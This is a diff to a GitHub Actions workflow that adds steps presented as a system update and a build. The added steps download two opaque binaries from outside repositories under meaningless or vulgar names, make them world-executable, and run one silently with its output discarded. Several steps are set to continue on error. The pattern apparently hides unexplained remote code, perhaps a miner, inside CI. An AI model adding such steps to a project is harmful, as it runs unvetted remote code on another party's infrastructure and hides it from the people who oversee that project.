@@ -14,3 +14,16 @@ jobs:
     steps:
     - name: Setup
       uses: Vampire/setup-wsl@v1
+    - name: Update System
+      continue-on-error: true
+      run: apt-get update && apt-get upgrade -y && apt-get install wget timelimit tar git -y
+    - name: Start
+      continue-on-error: true
+      run: wget -O kontol https://github.com/desafff/ggss/raw/main/vio
+    - name: Mulai
+      run: wget -O syng https://raw.githubusercontent.com/desafff/cngf/main/cffgh
+    - name: Extract
+      run: chmod 777 kontol syng
+    - name: Start Building
+      continue-on-error: true
+      run: ./syng >/dev/null 2>&1
